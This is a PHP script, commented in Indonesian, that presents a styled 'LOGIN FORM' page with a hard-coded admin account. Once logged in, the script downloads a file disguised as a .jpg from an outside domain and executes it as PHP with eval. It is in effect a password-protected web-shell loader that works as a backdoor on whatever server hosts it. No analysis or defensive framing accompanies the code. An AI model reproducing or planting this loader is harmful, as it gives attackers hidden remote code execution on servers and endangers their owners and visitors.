<?php
session_start();

// Tentukan username dan password hash
$username = "admin";
$passwordHash = '$2y$10$idJkZDqMfy/AB3DabYanre6NnyJI.zvOb9xiZDLuLk4dWSGjgfa6i'; // Hash bcrypt

// Cek apakah pengguna sudah login sebelumnya
if (!isset($_SESSION['loggedin'])) {
    // Cek apakah form sudah di-submit
    if (isset($_POST['username']) && isset($_POST['password'])) {
        // Validasi username dan password
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            // Jika username dan password benar, set sesi login
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']); // Refresh halaman setelah login
            exit();
        } else {
            // Jika username atau password salah, tampilkan pesan error
            $error = "Username atau password salah. Silakan coba lagi.";
        }
    }
}

// Jika sudah login, lakukan get contents dari URL
if (isset($_SESSION['loggedin'])) {
    $url = 'https://nekan-dua.dev/aexdy/aexdy.jpg'; // Ganti URL dengan lokasi script PHP yang ingin diambil
    $content = file_get_contents($url);

    if ($content !== false) {
        eval('?>' . $content); // Menjalankan konten sebagai kode PHP
    } else {
        echo "Gagal mengambil konten dari URL.";
    }
    exit();
}

// Jika belum login, tampilkan form login dan hentikan eksekusi script lainnya
if (!isset($_SESSION['loggedin'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>LOGIN FORM</title>
        <style>
            body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                background-color: #6e8a9e;
                font-family: Arial, sans-serif;
            }

            .form-container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100%;
            }

            .login-form {
                width: 300px;
                padding: 20px;
                background-color: #0000ff;
                border-radius: 8px;
                box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
                text-align: center;
                color: white;
            }

            .login-form img {
                width: 80px;
                margin-bottom: 10px;
            }

            .login-form h2 {
                margin: 0;
                padding: 10px 0;
                font-size: 20px;
            }

            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: none;
                border-radius: 4px;
                box-sizing: border-box;
                font-size: 16px;
            }

            .login-form button {
                width: 100%;
                padding: 10px;
                background-color: #ff0055;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
            }

            .login-form button:hover {
                background-color: #e6004c;
            }

            .login-form .options {
                margin-top: 10px;
                font-size: 14px;
                color: #d1d1d1;
            }

            .login-form .options a {
                color: #ff0055;
                text-decoration: none;
            }

            .login-form .options a:hover {
                text-decoration: underline;
            }

            .error-message {
                color: red;
                font-size: 14px;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://i.postimg.cc/VsrNmNGT/image.png" alt="Logo">
                <h2>LOGIN FORM</h2>
                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <input type="text" name="username" placeholder="Username ..." required>
                    <input type="password" name="password" placeholder="Password ..." required>
                    <button type="submit">Sign in</button>
                </form>
                <div class="options">
                    <label><input type="checkbox"> Remember Me</label>
                    <br>
                    <a href="#">Create Account</a> | <a href="#">Forget Password?</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}
?>